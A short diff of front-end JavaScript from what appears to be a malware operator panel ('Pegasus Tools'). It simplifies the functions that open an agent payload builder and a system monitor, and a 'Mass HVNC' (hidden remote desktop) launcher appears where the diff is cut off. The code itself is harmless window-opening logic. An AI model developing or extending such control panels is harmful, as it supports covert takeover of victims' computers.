@@ -332,37 +332,13 @@
 
   // Pegasus Tools Functions
   function launchAgentBuilder() {
-    const selectedAgents = $('.agent-checkbox:checked');
-    if (selectedAgents.length === 0) {
-      alert('Please select at least one agent to build payload for!');
-      return;
-    }
-
-    const agentIds = [];
-    selectedAgents.each(function () {
-      agentIds.push($(this).val());
-    });
-
-    // Open agent builder in new window
-    const builderUrl = `/tools/agent-builder?agents=${agentIds.join(',')}`;
-    window.open(builderUrl, 'AgentBuilder', 'width=800,height=600,scrollbars=yes');
+    // Open agent builder directly
+    window.open('/tools/agent-builder', 'AgentBuilder', 'width=1000,height=700,scrollbars=yes');
   }
 
   function launchSystemMonitor() {
-    const selectedAgents = $('.agent-checkbox:checked');
-    if (selectedAgents.length === 0) {
-      alert('Please select at least one agent to monitor!');
-      return;
-    }
-
-    const agentIds = [];
-    selectedAgents.each(function () {
-      agentIds.push($(this).val());
-    });
-
-    // Open system monitor in new window
-    const monitorUrl = `/tools/system-monitor?agents=${agentIds.join(',')}`;
-    window.open(monitorUrl, 'SystemMonitor', 'width=1200,height=800,scrollbars=yes');
+    // Open system monitor directly
+    window.open('/tools/system-monitor', 'SystemMonitor', 'width=1200,height=800,scrollbars=yes');
   }
 
   function launchMassHVNC() {
